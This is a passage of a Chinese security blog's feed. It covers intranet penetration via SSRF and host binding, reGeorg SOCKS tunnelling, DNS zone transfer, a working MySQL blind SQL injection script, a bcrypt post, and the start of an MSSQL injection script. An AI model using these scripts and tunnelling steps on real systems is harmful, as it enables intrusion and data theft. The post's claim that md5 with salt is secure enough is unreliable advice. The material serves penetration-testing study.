+<li>host绑定，直接访问内网业务<br>简单来说就是服务器内网外网双网卡，web服务器没能对访问者来源做检查，访问者在hosts文件中将内网域名与外网ip绑定，可直接访问内网的业务。<br>案例及说明：<br><a href="http://wps2015.jinglingshu.org/?p=172" target="_blank" rel="external">关于服务器的host绑定的不安全因素</a></li>
+<li>SSRF探测内网<br>SSRF(Server-Side Request Forgery:服务器端请求伪造)，是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统)。当然大多数的ssrf能探测到的内网信息有限，可辅助其他漏洞进行渗透。<br>案例：<br><a href="http://www.wooyun.org/bugs/wooyun-2015-0162607" target="_blank" rel="external">知乎主站一处SSRF漏洞可探测内网</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-099070" target="_blank" rel="external">百度某个从SSRF到内网WebShell</a><br>挖掘经验：<br><a href="http://bobao.360.cn/learning/detail/240.html" target="_blank" rel="external">SSRF漏洞的挖掘经验</a></li>
+</ul>
+<h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>&emsp;&emsp;正如电影《Who Am I – No System Is Safe》中描述的一样，没有真正安全的系统，自然也没有真正安全的内网防护体系。对于一个大型互联网公司来说，其实并不是因为他们安全做的不够好，而是守需要考虑的是一个面，而攻只需要一个点，对一个点进行深入的挖掘，一定可以找到突破口，而本身企业的安全建设其实也是一直在提高攻击门槛，并不是无懈可击。</p>
+<hr>
+<p>参考链接：<br><a href="http://drops.wooyun.org/tips/7831" target="_blank" rel="external">http://drops.wooyun.org/tips/7831</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x01-企业网络边界&quot;&gt;&lt;a href=&quot;#0x01-企业网络边界&quot; class=&quot;headerlink&quot; title=&quot;0x01 企业网络边界&quot;&gt;&lt;/a&gt;0x01 企业网络边界&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;我们知道既然要从外围进入内网，那么必然要做的一件事情就是跨越边界，所有这个命门我们也就自然应该在企业的内外网边界上来寻找。
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="内网" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>内网渗透之socks5代理（reGeorg+proxifier详细配置说明）</title>
+    <link href="http://yoursite.com/2016/03/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bsocks5%E4%BB%A3%E7%90%86%EF%BC%88reGeorg+proxifier%E8%AF%A6%E7%BB%86%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E%EF%BC%89/"/>
+    <id>http://yoursite.com/2016/03/02/内网渗透之socks5代理（reGeorg+proxifier详细配置说明）/</id>
+    <published>2016-03-02T08:48:10.000Z</published>
+    <updated>2016-04-13T07:52:03.436Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="1-首先我们需要明白正向代理和反向代理的区别"><a href="#1-首先我们需要明白正向代理和反向代理的区别" class="headerlink" title="1. 首先我们需要明白正向代理和反向代理的区别"></a>1. 首先我们需要明白正向代理和反向代理的区别</h3><p><strong>1.1 正向代理(Forward Proxy)</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lhost－－&gt;proxy－－&gt;Rhost</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。<a id="more"></a></p>
+<p><strong>1.2 反向代理（reverse proxy</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lhost&lt;－－&gt;proxy&lt;－－&gt;firewall&lt;－－&gt;Rhost</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;和正向代理相反（废话），Lhost只向proxy发送普通的请求，具体让他转到哪里，proxy自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许proxy数据进出的时候可以有效的进行穿透。</p>
+<p>&emsp;&emsp;而我们平常使用的reDuh、tunna，和reGeorg一样，都是正向代理。一般都是用户上传一个代理脚本到服务器端，本地的程序去连接服务器上的脚本，脚本程序做代理转发端口和流量。</p>
+<h3 id="2-工具介绍"><a href="#2-工具介绍" class="headerlink" title="2. 工具介绍"></a>2. 工具介绍</h3><p><strong>2.1 reGeorg</strong><br>&emsp;&emsp;reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高。</p>
+<p>&emsp;&emsp;reGeorg下载地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="external">下载</a></p>
+<p><strong>2.2 proxifier</strong></p>
+<p>&emsp;&emsp;Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。</p>
+<p>&emsp;&emsp;下载地址：<a href="https://www.proxifier.com/" target="_blank" rel="external">下载</a></p>
+<p>&emsp;&emsp;激活码：  <a href="http://wenku.baidu.com/link?url=T9od33JuA7jjxzfyV-wOjsYyARbVXwuXs2GwWwXLkX6vxRU4Rj0p_e2_0l1A0-WT9NOs3sh1OqDbYBgFYXLyjfconba4FF4iqdoz-tV5GH_" target="_blank" rel="external">查看</a></p>
+<h3 id="3-工具配置"><a href="#3-工具配置" class="headerlink" title="3. 工具配置"></a>3. 工具配置</h3><p>&emsp;&emsp;先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, ‘All seems fine’”，表示脚本运行正常</p>
+<p><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2jKQ4mVXXXXbfXpXXXXXXXXXX_!!792076116.png" alt="clipboard"></p>
+<p>&emsp;&emsp;运行py程序：<code>python reGeorgSocksProxy.py -p 8888 -u http:www.exemple.com/test/tunnel.jsp</code></p>
+<p>&emsp;&emsp;将proxifier打开，在Proxy Server中这样配置</p>
+<p><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2nSXwnXXXXXXdXXXXXXXXXXXX_!!792076116.png" alt="clipboard (2)"></p>
+<p>&emsp;&emsp;然后在远程桌面程序上右键，以Proxifier选择“Proxy SOCKS5 127.0.0.1”打开。ipconfig查询内网机器的ip</p>
+<p><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2Xfw2mVXXXXbJXpXXXXXXXXXX_!!792076116.png" alt="clipboard (3)"></p>
+<p>&emsp;&emsp;直接在远程连接上输入内网机器的内网ip</p>
+<p><img src="https://img.alicdn.com/imgextra/i1/792076116/TB2hdljnXXXXXclXXXXXXXXXXXX_!!792076116.png" alt="clipboard (4)"></p>
+<p>&emsp;&emsp;点击连接即可。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;1-首先我们需要明白正向代理和反向代理的区别&quot;&gt;&lt;a href=&quot;#1-首先我们需要明白正向代理和反向代理的区别&quot; class=&quot;headerlink&quot; title=&quot;1. 首先我们需要明白正向代理和反向代理的区别&quot;&gt;&lt;/a&gt;1. 首先我们需要明白正向代理和反向代理的区别&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;1.1 正向代理(Forward Proxy)&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Lhost－－&amp;gt;proxy－－&amp;gt;Rhost&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&amp;emsp;&amp;emsp;Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。
+    
+    </summary>
+    
+      <category term="工具使用" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
+    
+    
+      <category term="内网" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>关于服务器的host绑定的不安全因素</title>
+    <link href="http://yoursite.com/2015/09/29/%E5%85%B3%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84host%E7%BB%91%E5%AE%9A%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E5%9B%A0%E7%B4%A0/"/>
+    <id>http://yoursite.com/2015/09/29/关于服务器的host绑定的不安全因素/</id>
+    <published>2015-09-29T08:24:59.000Z</published>
+    <updated>2016-05-15T12:32:04.508Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>1、host主机头</strong><br>host主机头绑定是很多网站常用的一种一机多站的实现方法,相对于使用不同端口来实现一机多站要安全许多,因为端口可以通过暴力手段找到,而host绑定就要难破解很多,因为需要IP和主机名的对应.<a id="more"></a></p>
+<p><strong>2、漏洞成因及危害</strong><br>很多网站为了方便管理和节省服务器成本,将内网管理站点和外网站点放置在同一服务器下,使用一机多站来进行隔离.</p>
+<p>很多情况下一台服务器安装两块网卡,分别接入外网和内网,方便公网访问公开站点,内网访问管理站点.并绑定host.</p>
+<p>例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx.com为公开站点,并且指向IP为公网网卡.</span><br><span class="line">admin.xxx.com为管理站点,并且指向内网网卡.</span><br></pre></td></tr></table></figure></p>
+<p>看上去好像管理站点admin.xxx.com必须在内网才能访问但是却忽略了host绑定的问题.</p>
+<p>但是当我们将外网IP地址强制绑定到admin.xxx.com的时候web服务器又没有做来源检查,那么我们就可以通过外网访问到本来应该只有内网才能访问的管理站点了.</p>
+<p>并且由于是内网站点很多情况下管理员为了方便都是弱密码,或者直接未授权访问等</p>
+<p><strong>3、漏洞的利用</strong><br>利用的话可以直接使用域名的一个暴力猜解</p>
+<p>将外网IP和内网IP的域名全部记录下来</p>
+<p>例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx.com ip 1.1.1.1</span><br><span class="line">admin.xxx.com ip 10.0.0.1</span><br></pre></td></tr></table></figure></p>
+<p>再使用工具将内网域名绑定到外网站点的IP上</p>
+<p>写入hosts文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.1.1.1 admin.xxx.com</span><br></pre></td></tr></table></figure></p>
+<p>即可访问到内网站点了</p>
+<p>4、漏洞案例<br><a href="http://www.wooyun.org/bugs/wooyun-2014-081180" target="_blank" rel="external">途牛另类方式导致内网部分敏感系统泄露</a></p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2010-093577" target="_blank" rel="external">盛大某游戏GM工具注入进入后台</a></p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2010-088352" target="_blank" rel="external">傲游内网不完整漫游(大量内外网源码可被泄漏)</a></p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0134151" target="_blank" rel="external">一下科技运维不当导致内部敏感信息泄漏</a></p>
+<p>转自：<a href="http://wiki.wooyun.org/server:host" target="_blank" rel="external">http://wiki.wooyun.org/server:host</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;strong&gt;1、host主机头&lt;/strong&gt;&lt;br&gt;host主机头绑定是很多网站常用的一种一机多站的实现方法,相对于使用不同端口来实现一机多站要安全许多,因为端口可以通过暴力手段找到,而host绑定就要难破解很多,因为需要IP和主机名的对应.
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="host" scheme="http://yoursite.com/tags/host/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Mysql布尔盲注脚本</title>
+    <link href="http://yoursite.com/2015/07/15/Mysql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"/>
+    <id>http://yoursite.com/2015/07/15/Mysql布尔盲注脚本/</id>
+    <published>2015-07-15T14:00:44.000Z</published>
+    <updated>2016-05-15T12:35:01.046Z</updated>
+    
+    <content type="html"><![CDATA[<p>当某个盲注点不能使用工具（一般有waf限制）的时候，可以使用这个脚本用于证明漏洞的存在<a id="more"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#! usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import httplib</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">headers = &#123;&apos;User-Agent&apos;: &apos;Mozilla/5.0 Chrome/28.0.1500.63&apos;,&#125;</span><br><span class="line">payloads = list(&apos;abcdefghijklmnopqrstuvwxyz0123456789@_.&apos;)</span><br><span class="line">print &apos;start to retrive MySQL user:&apos;</span><br><span class="line">user = &apos;&apos;</span><br><span class="line">for i in range(1,21):</span><br><span class="line">	for payload in payloads:</span><br><span class="line">		conn = httplib.HTTPConnection(&apos;www.example.com&apos;, timeout=4)      #连接,host</span><br><span class="line">		s = &quot;ascii(mid(lower(user()),%s,1))=%s&quot; % (i, ord(payload))       #payload</span><br><span class="line">		conn.request(method=&apos;GET&apos;,url=&quot;/php/1.php?id=1 and %s&quot; % s,headers = headers)  #url</span><br><span class="line">		html_header= conn.getresponse().read()</span><br><span class="line">		length=len(html_header)</span><br><span class="line">		if length&gt;10000:</span><br><span class="line">			user+=payload</span><br><span class="line">			sys.stdout.write(&apos;\r[In progress] %s&apos; % user)</span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">			break</span><br><span class="line">		else:</span><br><span class="line">			print &apos;.&apos;,</span><br><span class="line">			conn.close()</span><br><span class="line"></span><br><span class="line">print &apos;\n[Done]MySQL user is&apos;, user</span><br></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;当某个盲注点不能使用工具（一般有waf限制）的时候，可以使用这个脚本用于证明漏洞的存在
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>DNS域传送漏洞利用方法</title>
+    <link href="http://yoursite.com/2015/07/13/DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"/>
+    <id>http://yoursite.com/2015/07/13/DNS域传送漏洞利用方法/</id>
+    <published>2015-07-13T03:10:37.000Z</published>
+    <updated>2016-05-15T12:32:47.829Z</updated>
+    
+    <content type="html"><![CDATA[<p>其实利用方法分为手工和工具两种，我们可以利用BT5下面的工具Dnsenum或者是其它工具，手工的话就利用nslookup即可。<a id="more"></a></p>
+<p><strong>1、使用工具来获取DNS信息</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /pentest/enumeration/dns/dnsenum</span><br><span class="line">./dnsenum.pl –enum domain.com</span><br></pre></td></tr></table></figure>
+<p>这样就可以简单的利用了。</p>
+<p><strong>2、使用手工的方法，推荐。</strong><br>方法如下图。查询过程如图所显示:</p>
+<p>[<img src="http://www.wooyun.org/upload/201202/15161935b7b1610dcdc653216971d50b16c5e88f.jpg" alt="1259002Mo"><br>查询结果保存在189store.com.txt中<br>使用如下指令查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view 189store.com.txt</span><br></pre></td></tr></table></figure></p>
+<p>有74条记录</p>
+<p>[<img src="http://www.wooyun.org/upload/201202/1516215365c2c8081bb7ba32c7a37bab4b020d78.jpg" alt="125900JRF">]<br>[<img src="http://www.wooyun.org/upload/201202/15162218a04914ae310f75e599a22b128ec49f4b.jpg" alt="125901P6x">]</p>
+<p><strong>3.漏洞证明：</strong></p>
+<p>见上面的详细说明</p>
+<p><strong>4.修复方案：</strong></p>
+<p>ns.westidc.com.cn（221.236.9.9） 与 ns.westidc.net.cn（210.77.146.30） 都没有做访问控制<br>定义ACL(访问控制列表)来限制在域名服务器之间的区域传送<br>编辑/etc/named.conf<br>在189store.com的zone配置中设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow-transfer &#123; localhost; 221.236.9.9; &#125;;</span><br><span class="line">或</span><br><span class="line">allow-transfer &#123; localhost; 210.77.146.30; &#125;;</span><br></pre></td></tr></table></figure></p>
+<p>原文：<a href="http://www.waitalone.cn/post/DNSTransfer.html" target="_blank" rel="external">http://www.waitalone.cn/post/DNSTransfer.html</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;其实利用方法分为手工和工具两种，我们可以利用BT5下面的工具Dnsenum或者是其它工具，手工的话就利用nslookup即可。
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="DNS" scheme="http://yoursite.com/tags/DNS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python unicode字节串转成中文问题  （转）</title>
+    <link href="http://yoursite.com/2015/06/18/python%20unicode%E5%AD%97%E8%8A%82%E4%B8%B2%E8%BD%AC%E6%88%90%E4%B8%AD%E6%96%87%E9%97%AE%E9%A2%98/"/>
+    <id>http://yoursite.com/2015/06/18/python unicode字节串转成中文问题/</id>
+    <published>2015-06-18T02:14:26.000Z</published>
+    <updated>2016-05-15T12:34:08.251Z</updated>
+    
+    <content type="html"><![CDATA[<p>&emsp;&emsp;如题，其实我的问题很简单，就是在写爬虫的时候拿到网页的信息包含类似”\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”的字符串，实际上这是unicode的中文编码，对应的中文为“新浪微博注册”。其实我就是想找一个函数让这一串东西显示中文而已，没想到百度了白天找到合适的。<a id="more"></a>遇到这种问题千万不要用什么 “python编码” “unicode中文编码” “unicode解码”这样的关键字去搜，一大堆网页出来毫不相关。<br>&emsp;&emsp;其实这个问题一个函数搞定，如下：<br>Example 1:<br>&gt;&gt;&gt; s = r”\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”<br>&gt;&gt;&gt; s<br>‘\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c’<br>&gt;&gt;&gt; print s<br>\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c<br>&gt;&gt;&gt; s = s.decode(“unicode_escape”); #就是这个函数<br>&gt;&gt;&gt; print s</p>
+<p>Example 2:<br>&gt;&gt;&gt; str<em> = “Russopho\xe9bic, clichd and just pl\xe9ain stupid.”<br>&gt;&gt;&gt; print str</em><br>Russopho?bic, clichd and just pl?ain stupid.<br>&gt;&gt;&gt; str<em> = str</em>.decode(“unicode<em>escape”)<br>&gt;&gt;&gt; print str</em><br>&emsp;&emsp;这个方法解决了我在插入数据到mongodb时遇到的“bson.errors.InvalidStringData: strings in documents must be valid UTF-8”问题。<br>&emsp;&emsp;附上关于这个问题的相关博客链接：<a href="http://www.cnblogs.com/yangze/archive/2010/11/16/1878469.html" target="_blank" rel="external">戳这里</a>。另外还有一个与unicode字节串有关的问题，遇到这样的错误提示：Unicode equal comparison failed to convert both arguments to Unicode - interpreting them as being unequal。说明我们在对两个字符（串）进行对比的时候等号两边的类型<br>不一样，可能是一边是unicode字节串，一边是字符串。详见<a href="http://stackoverflow.com/questions/3400171/python-utf-8-comparison。" target="_blank" rel="external">http://stackoverflow.com/questions/3400171/python-utf-8-comparison。</a></p>
+<p>小结：<br>以后遇到奇葩问题要想好关键字再搜，不然很有可能一无所获。</p>
+<hr>
+<p>转：<a href="http://windkeepblow.blog.163.com/blog/static/1914883312013988185783/" target="_blank" rel="external">http://windkeepblow.blog.163.com/blog/static/1914883312013988185783/</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&amp;emsp;&amp;emsp;如题，其实我的问题很简单，就是在写爬虫的时候拿到网页的信息包含类似”\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”的字符串，实际上这是unicode的中文编码，对应的中文为“新浪微博注册”。其实我就是想找一个函数让这一串东西显示中文而已，没想到百度了白天找到合适的。
+    
+    </summary>
+    
+      <category term="编程" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PHP5.5使用Bcrypt加密密码</title>
+    <link href="http://yoursite.com/2015/05/21/PHP5.5%E4%BD%BF%E7%94%A8Bcrypt%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A0%81/"/>
+    <id>http://yoursite.com/2015/05/21/PHP5.5使用Bcrypt加密密码/</id>
+    <published>2015-05-21T06:58:55.000Z</published>
+    <updated>2016-05-15T12:33:55.428Z</updated>
+    
+    <content type="html"><![CDATA[<p>在php5.5中，加入了一个新的密码哈希函数，可使用Bcrypt轻松实现加盐的安全密码。</p>
+<p>bcrypt和其他对称或非对称加密方式不同的是，不是直接解密得到明文，也不是二次加密比较密文，而是把明文和存储的密文一块运算得到另一个密文，如果这两个密文相同则验证成功。<a id="more"></a></p>
+<p>官方手册在这里： <a href="http://cn2.php.net/manual/zh/book.password.php" target="_blank" rel="external">http://cn2.php.net/manual/zh/book.password.php</a></p>
+<p>生成密钥</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$hash = password_hash(<span class="string">'password'</span>,PASSWORD_BCRYPT,[<span class="string">'cost'</span> =&amp;gt; <span class="number">10</span>]);</span><br><span class="line"><span class="keyword">echo</span> $hash;</span><br></pre></td></tr></table></figure>
+<p>password_hash() —-加密密码<br>第一个参数：需要加密的密码<br>第二个参数：密码算法常量 (<a href="http://cn2.php.net/manual/zh/password.constants.php" target="_blank" rel="external">http://cn2.php.net/manual/zh/password.constants.php</a>)<br>第三个参数：数组类型。支持两个选项：salt在散列密码时加的盐（干扰字符串）。cost用来指明算法递归的层数。</p>
+<p>上面代码每次运行生成的密钥不同，大致效果如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="number">2</span>y$<span class="number">10</span>$bWNfw6QbjmjyCDBc9lrZRuBjraxBzN7eAuozS6D3r4QxJn0tgXRwe</span><br></pre></td></tr></table></figure>
+<p>生成的密钥长度为60位，所以设计数据库的时候需要注意。</p>
+<p>验证密钥</p>
+<p>懒得存数据库再去取了，直接把刚生成的密钥复制过来了~~</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$hash = <span class="string">'$2y$10$bWNfw6QbjmjyCDBc9lrZRuBjraxBzN7eAuozS6D3r4QxJn0tgXRwe'</span>;</span><br><span class="line">$res = password_verify(<span class="string">'password'</span>,$hash);</span><br><span class="line">var_dump($res);</span><br></pre></td></tr></table></figure>
+<p>如果没有天灾人祸意外发生的话。你会看到下面的输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool(true)</span><br></pre></td></tr></table></figure>
+<p>这就成功了。</p>
+<p>性能</p>
+<p>下面我们来看看Bcrypt的性能，安全性的提升，肯定是以性能为代价。bcrypt要加强密码安全性，增加运行时间也是肯定的。那我们现在就测试一下Bcrypt与普通md5的速度。</p>
+<p>测试机性能：</p>
+<p>CPU I7 4核 2.3G主频<br>内存 16G ddr3 内存<br>系统 Mac<br>PHP 5.5.15</p>
+<p>现在用下面这段代码分别测试一下md5和Bcrypt在不加盐的情况下的运行速度<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php</span><br><span class="line"> $s_time = microtime(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">password_hash(<span class="string">'password'</span>,PASSWORD_BCRYPT,[<span class="string">'cost'</span> =&amp;gt; <span class="number">10</span>]);</span><br><span class="line"><span class="comment">// md5('password');</span></span><br><span class="line">$e_time = microtime(<span class="keyword">true</span>);</span><br><span class="line">$run_time = $e_time-$s_time;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> ($run_time*<span class="number">1000</span>).<span class="string">'ms'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>Bcrypt 5次运行结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">68.569183349609ms</span><br><span class="line">68.006992340088ms</span><br><span class="line">69.074869155884ms</span><br><span class="line">68.211078643799ms</span><br><span class="line">68.757057189941ms</span><br></pre></td></tr></table></figure></p>
+<p>md5 5次运行结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0.0040531158447266ms</span><br><span class="line">0.0040531158447266ms</span><br><span class="line">0.0050067901611328ms</span><br><span class="line">0.0040531158447266ms</span><br></pre></td></tr></table></figure>
+<p>测试结果</p>
+<p>Bcrypt 加密一个密文平均值在68毫秒左右，md5 加密一个密文平均值在0.004毫秒左右，性能大约差距16000倍。<br>采用md5 一秒大约能加密 250000个密文<br>采用Bcrypt 一秒大约能加密 14个密文<br>所以，如果你要将Bcrypt用到你的程序中去的话。小应用还好，如果是大应用。您就得按倍数增加服务器了。<br>如果不是给五角大楼写程序，其实md5+salt安全性已经足够了。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在php5.5中，加入了一个新的密码哈希函数，可使用Bcrypt轻松实现加盐的安全密码。&lt;/p&gt;
+&lt;p&gt;bcrypt和其他对称或非对称加密方式不同的是，不是直接解密得到明文，也不是二次加密比较密文，而是把明文和存储的密文一块运算得到另一个密文，如果这两个密文相同则验证成功。
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>基于mssql的报错注入的脚本(get)</title>
+    <link href="http://yoursite.com/2015/04/07/%E5%9F%BA%E4%BA%8Emssql%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E8%84%9A%E6%9C%AC(get)/"/>
+    <id>http://yoursite.com/2015/04/07/基于mssql的报错注入的脚本(get)/</id>
+    <published>2015-04-07T13:02:13.000Z</published>
+    <updated>2016-05-15T12:47:25.036Z</updated>
+    
+    <content type="html"><![CDATA[<p>在进行mssql注入的时候，由于各种各样的原因，我们不能使用工具进行值得获取，那么可以自行编写脚本来获取值，python由于其良好的抓取网页的功能，被大家广泛使用。<a id="more"></a></p>
+<p>对于get型的mssql的报错注入,代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 